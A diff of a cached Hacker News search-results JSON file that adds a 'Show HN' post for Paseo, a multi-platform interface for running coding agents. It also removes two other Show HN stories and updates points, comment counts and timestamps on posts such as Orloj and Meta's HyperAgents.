+              "value": "Hey HN, I'm Mo. I'm building Paseo, a multi-platform interface for running <em>Claude</em> <em>Code</em>, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there's a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for <em>Claude</em> <em>Code</em>. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the agent was doing, then I wanted to text it when I couldn't talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don't step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party agent CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to both native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I'd say that with discipline it's doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it's holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced agent orchestration, it has much better ergonomics than existing harnesses, and I'm already using it to experiment with loops and agent teams, although it's still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (<em>Claude</em> <em>Code</em> Remote Control, Codex app, etc.), but with mixed quality and you're locked onto their models. Most other <em>alternatives</em> I know about found are either closed source or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that's all you need. But you can also `npm install -g @getpaseo/cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https://github.com/getpaseo/paseo\" rel=\"nofollow\">https://github.com/getpaseo/paseo</a><p>Homepage: <a href=\"https://paseo.sh/\" rel=\"nofollow\">https://paseo.sh/</a><p>Discord: <a href=\"https://discord.gg/jz8T2uahpH\" rel=\"nofollow\">https://discord.gg/jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!"
+            },
+            "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "Show HN: Paseo – Open-source coding agent interface (desktop, mobile, CLI)"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_boudra",
+            "story_47529963",
+            "show_hn"
+          ],
+          "author": "boudra",
+          "children": [
+            47530049
+          ],
+          "created_at": "2026-03-26T13:06:06Z",
+          "created_at_i": 1774530366,
+          "num_comments": 1,
+          "objectID": "47529963",
+          "points": 3,
+          "story_id": 47529963,
+          "story_text": "Hey HN, I&#x27;m Mo. I&#x27;m building Paseo, a multi-platform interface for running Claude Code, Codex and OpenCode. The daemon runs on any machine (your Macbook, a VPS, whatever) and clients (web, mobile, desktop, CLI) connect over WebSocket (there&#x27;s a built-in E2EE relay for convenience, but you can opt-out).<p>I started working on Paseo last September as a push-to-talk voice interface for Claude Code. I wanted to bounce ideas hands-free while going on walks, after a while I wanted to see what the agent was doing, then I wanted to text it when I couldn&#x27;t talk, then I wanted to see diffs and run multiple agents. I kept fixing rough edges and adding features, and slowly it became what it is today.<p>What it does:<p>- Run multiple providers through the same UI<p>- Works on macOS, Linux, Windows, iOS, Android, and web<p>- Manage agents in different machines from the same UI<p>- E2EE Relay for mobile connectivity<p>- Local voice chat and dictation (NVIDIA Parakeet + Kokoro + Sherpa ONNX)<p>- Split panes to work with agents, files and terminals side by side<p>- Git panel to review diffs and do common actions (commit, push, create PR etc.)<p>- Git worktree management so agents don&#x27;t step on each other<p>- Docker-style CLI to run agents<p>- No telemetry, no tracking, no login<p>Paseo does not call inference APIs directly or extract your OAuth tokens. It wraps your first-party agent CLIs and runs them exactly as you would in your terminal. Your sessions, your system prompts, your tools, nothing is intercepted or modified.<p>Stack: The daemon is written in Typescript. The app uses Expo and compiles to both native mobile apps and web. The desktop app is in Electron (I started with Tauri and had to migrate). Sharing the same codebase across different form factors was challenging but I&#x27;d say that with discipline it&#x27;s doable an the result has been worth it, as most features I build automatically work in all clients. I did have to implement some platform specific stuff, especially around gestures, audio and scroll behavior. The relay is built on top of Cloudflare DO, so far it&#x27;s holding up quite well.<p>I love using the app, but I am even more excited about the possibilities of the CLI, as it become a primitive for more advanced agent orchestration, it has much better ergonomics than existing harnesses, and I&#x27;m already using it to experiment with loops and agent teams, although it&#x27;s still new territory.<p>How Paseo compares to similar apps: Anthropic and OpenAI already do some of what Paseo does (Claude Code Remote Control, Codex app, etc.), but with mixed quality and you&#x27;re locked onto their models. Most other alternatives I know about found are either closed source or not flexible enough for my needs.<p>The license is AGPL-3.0. The desktop app ships with a daemon so that&#x27;s all you need. But you can also `npm install -g @getpaseo&#x2F;cli` for headless mode and connect via any client.<p>I mainly use Mac, so Linux and Windows has mostly been tested by a small group of early adopters. If you run into issues, I’d appreciate bug reports on GitHub!<p>Repo: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;getpaseo&#x2F;paseo</a><p>Homepage: <a href=\"https:&#x2F;&#x2F;paseo.sh&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;paseo.sh&#x2F;</a><p>Discord: <a href=\"https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH\" rel=\"nofollow\">https:&#x2F;&#x2F;discord.gg&#x2F;jz8T2uahpH</a><p>Happy to answer questions about the product, architecture or whatever else!",
+          "title": "Show HN: Paseo – Open-source coding agent interface (desktop, mobile, CLI)",
+          "updated_at": "2026-03-26T13:15:35Z"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
               "value": "phillipclapham"
             },
             "story_text": {
@@ -1456,96 +1460,6 @@
           "title": "Show HN: Claude Code Channels Headless via Discord (OpenClaw Alternative)",
           "updated_at": "2026-03-20T13:04:39Z",
           "url": "https://jaredezz.tech/posts/claude-code-channels-discord-openclaw-alternative/"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "clmnt"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "claude",
-                "code",
-                "alternative"
-              ],
-              "value": "We've been building out CLI extensions for the Hugging Face hub, and hf-agents is a fun one to share.<p>It uses llmfit under the hood to profile your hardware and automatically select the best-fit model and quantization — no manual GGUF hunting. It then launches a Pi Agent on top of it. One command, local, fully open.<p>If you've been using <em>Claude</em> <em>Code</em> or Codex CLI and want something that runs entirely on your own hardware/models, this is a nice lightweight <em>alternative</em> to try.<p>Happy to answer questions — and curious what hardware setups people are running this on."
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "Show HN: HF-agents, CLI extension to find the best model/quant for your hardware"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://github.com/huggingface/hf-agents"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_clmnt",
-            "story_47430624",
-            "show_hn"
-          ],
-          "author": "clmnt",
-          "created_at": "2026-03-18T19:54:19Z",
-          "created_at_i": 1773863659,
-          "num_comments": 0,
-          "objectID": "47430624",
-          "points": 2,
-          "story_id": 47430624,
-          "story_text": "We&#x27;ve been building out CLI extensions for the Hugging Face hub, and hf-agents is a fun one to share.<p>It uses llmfit under the hood to profile your hardware and automatically select the best-fit model and quantization — no manual GGUF hunting. It then launches a Pi Agent on top of it. One command, local, fully open.<p>If you&#x27;ve been using Claude Code or Codex CLI and want something that runs entirely on your own hardware&#x2F;models, this is a nice lightweight alternative to try.<p>Happy to answer questions — and curious what hardware setups people are running this on.",
-          "title": "Show HN: HF-agents, CLI extension to find the best model/quant for your hardware",
-          "updated_at": "2026-03-19T02:37:18Z",
-          "url": "https://github.com/huggingface/hf-agents"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "justswim"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "claude",
-                "code",
-                "alternative"
-              ],
-              "value": "Hi HN, I'm excited to release the weights and full inference stack of an AI model that I've been working on for the past few weeks. Lens is a font recognition model that takes an image and returns the closest matching open-source font that it finds in the image.<p>Recognizing the closest font from an image of text accurately has always been a challenge. Even SOTA vision LLMs can detect basic characteristics like if a font is a serif or a sans-serif, but when it comes to the actual font file that has the most similar styles, vision LLMs will often be quite off for the design and style of a chosen font file.<p>Popular font identification solutions on the internet today also have a two major shortcomings:<p>1. Most of them work based off identifying particular characters and don’t look at an overall word or image, so they require a manual character segmenting step. \n2. Most online tools identify fonts from on a proprietary dataset of commercial fonts in order to monetize. However, this makes it difficult when building applications because often times the recognized fonts can’t be used or downloaded easily.<p>To solve this, I trained the Lens model on a large collection of open-source fonts (mostly Google Fonts, but also a few other open source / freely available fonts). The Lens model is also trained on a large collection of images, each which contain a variety of font styles and weights. As far as I can tell, Lens is the most accurate model right now that maps images to fonts in a single step.<p>I came up with the idea to create this model when I was playing around more with vibe coding tools like <em>Claude</em> <em>Code</em> and Codex. I noticed that when I would ask AI to implement a screenshot exactly, one of the main issues was always the fonts that the AI would choose. They would never match the screenshot exactly, and then swapping out the fonts for a usable <em>alternative</em> was always a pain for me personally.<p>Under the hood this is a classification model built on top of the Resnet 18 architecture. It is trained on over 1000+ fonts and 1.5m+ images.<p>The entire inference stack and model weights are available on Github: <a href=\"https://github.com/mixfont/lens\" rel=\"nofollow\">https://github.com/mixfont/lens</a>.\nI also created a playground for the model on my website where it can be demo’d for free: <a href=\"https://www.mixfont.com/models/lens\" rel=\"nofollow\">https://www.mixfont.com/models/lens</a><p>Blog post on the training process coming soon! Would love to hear what you all think and some potential applications of a model like this. Happy to answer other questions in the meantime - thank you for checking it out!"
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "Show HN: Lens – Open-weight AI model to identify fonts from images"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_justswim",
-            "story_47405761",
-            "show_hn"
-          ],
-          "author": "justswim",
-          "children": [
-            47414681,
-            47410150
-          ],
-          "created_at": "2026-03-16T22:19:08Z",
-          "created_at_i": 1773699548,
-          "num_comments": 3,
-          "objectID": "47405761",
-          "points": 3,
-          "story_id": 47405761,
-          "story_text": "Hi HN, I&#x27;m excited to release the weights and full inference stack of an AI model that I&#x27;ve been working on for the past few weeks. Lens is a font recognition model that takes an image and returns the closest matching open-source font that it finds in the image.<p>Recognizing the closest font from an image of text accurately has always been a challenge. Even SOTA vision LLMs can detect basic characteristics like if a font is a serif or a sans-serif, but when it comes to the actual font file that has the most similar styles, vision LLMs will often be quite off for the design and style of a chosen font file.<p>Popular font identification solutions on the internet today also have a two major shortcomings:<p>1. Most of them work based off identifying particular characters and don’t look at an overall word or image, so they require a manual character segmenting step. \n2. Most online tools identify fonts from on a proprietary dataset of commercial fonts in order to monetize. However, this makes it difficult when building applications because often times the recognized fonts can’t be used or downloaded easily.<p>To solve this, I trained the Lens model on a large collection of open-source fonts (mostly Google Fonts, but also a few other open source &#x2F; freely available fonts). The Lens model is also trained on a large collection of images, each which contain a variety of font styles and weights. As far as I can tell, Lens is the most accurate model right now that maps images to fonts in a single step.<p>I came up with the idea to create this model when I was playing around more with vibe coding tools like Claude Code and Codex. I noticed that when I would ask AI to implement a screenshot exactly, one of the main issues was always the fonts that the AI would choose. They would never match the screenshot exactly, and then swapping out the fonts for a usable alternative was always a pain for me personally.<p>Under the hood this is a classification model built on top of the Resnet 18 architecture. It is trained on over 1000+ fonts and 1.5m+ images.<p>The entire inference stack and model weights are available on Github: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;mixfont&#x2F;lens\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;mixfont&#x2F;lens</a>.\nI also created a playground for the model on my website where it can be demo’d for free: <a href=\"https:&#x2F;&#x2F;www.mixfont.com&#x2F;models&#x2F;lens\" rel=\"nofollow\">https:&#x2F;&#x2F;www.mixfont.com&#x2F;models&#x2F;lens</a><p>Blog post on the training process coming soon! Would love to hear what you all think and some potential applications of a model like this. Happy to answer other questions in the meantime - thank you for checking it out!",
-          "title": "Show HN: Lens – Open-weight AI model to identify fonts from images",
-          "updated_at": "2026-03-17T20:00:43Z"
         }
       ]
     },
@@ -2116,11 +2030,11 @@
           "created_at_i": 1774501671,
           "num_comments": 0,
           "objectID": "47526813",
-          "points": 1,
+          "points": 2,
           "story_id": 47526813,
           "story_text": "Hey HN, we&#x27;re Jon and Kristiane, and we&#x27;re building Orloj (<a href=\"https:&#x2F;&#x2F;orloj.dev\" rel=\"nofollow\">https:&#x2F;&#x2F;orloj.dev</a>), an open-source (Apache 2.0) orchestration runtime for multi-agent AI systems. You define agents, tools, policies, and workflows in declarative YAML manifests, and Orloj handles scheduling, execution, governance, and reliability.<p>We built this because running AI agents in production today looks a lot like running containers before Kubernetes: ad-hoc scripts, no governance, no observability, no standard way to manage the lifecycle of an agent fleet. Everyone we talked to was writing the same messy glue code to wire agents together, and nobody had a good answer for &quot;which agent called which tool, and was it supposed to?&quot;<p>Orloj treats agents the way infrastructure-as-code treats cloud resources. You write a manifest that declares an agent&#x27;s model, tools, permissions, and execution limits. You compose agents into directed graphs — pipelines, hierarchies, or swarm loops.<p>The part we&#x27;re most excited about is governance. AgentPolicy, AgentRole, and ToolPermission are evaluated inline during execution, before every agent turn and tool call. Instead of prompt instructions that the model might ignore, these policies are a runtime gate. Unauthorized actions fail closed with structured errors and full audit trails. You can set token budgets per run, whitelist models, block specific tools, and scope policies to individual agent systems.<p>For reliability, we built lease-based task ownership (so crashed workers don&#x27;t leave orphan tasks), capped exponential retry with jitter, idempotent replay, and dead-letter handling. The scheduler supports cron triggers and webhook-driven task creation.<p>The architecture is a server&#x2F;worker split. orlojd hosts the API, resource store (in-memory for dev, Postgres for production), and task scheduler. orlojworker instances claim and execute tasks, route model requests through a gateway (OpenAI, Anthropic, Ollama, etc.), and run tools in configurable isolation — direct, sandboxed, container, or WASM. For local development, you can run everything in a single process with orlojd --embedded-worker --storage-backend=memory.<p>Tool isolation was important to us. A web search tool probably doesn&#x27;t need sandboxing, but a code execution tool should run in a container with no network, a read-only filesystem, and a memory cap. You configure this per tool based on risk level, and the runtime enforces it.<p>We also added native MCP support. You register an MCP server (stdio or HTTP), Orloj auto-discovers its tools, and they become first-class resources with governance applied. So you can connect something like the GitHub MCP server and still have policy enforcement over what agents are allowed to do with it.<p>Three starter blueprints are included (pipeline, hierarchical, swarm-loop).<p>Docs: <a href=\"https:&#x2F;&#x2F;docs.orloj.dev\" rel=\"nofollow\">https:&#x2F;&#x2F;docs.orloj.dev</a><p>We&#x27;re also building out starter templates for operational workflows where governance really matters. First on the roadmap: 1. Incident response triage, 2. Compliance evidence collector, 3. CVE investigation pipeline, and 4. Secret rotation auditor. We have 20 templates in mind and community contributions are welcome.<p>We&#x27;re a small team and this is v0.1.0, so there&#x27;s a lot still on the roadmap — hosted cloud, compliance packaging, and more. But the full runtime is open source today and we&#x27;d love feedback on what we&#x27;ve built so far. What would you use this for? What&#x27;s missing?",
           "title": "Show HN: Orloj – agent infrastructure as code (YAML and GitOps)",
-          "updated_at": "2026-03-26T05:12:17Z",
+          "updated_at": "2026-03-26T11:48:49Z",
           "url": "https://github.com/OrlojHQ/orloj"
         },
         {
@@ -2355,16 +2269,17 @@
           ],
           "author": "grodriguez100",
           "children": [
-            47528849
+            47528849,
+            47529382
           ],
           "created_at": "2026-03-26T10:41:40Z",
           "created_at_i": 1774521700,
-          "num_comments": 1,
+          "num_comments": 2,
           "objectID": "47528807",
           "points": 2,
           "story_id": 47528807,
           "title": "Meta releases HyperAgents: self-improving AI",
-          "updated_at": "2026-03-26T10:47:48Z",
+          "updated_at": "2026-03-26T12:03:18Z",
           "url": "https://github.com/facebookresearch/Hyperagents"
         },
         {
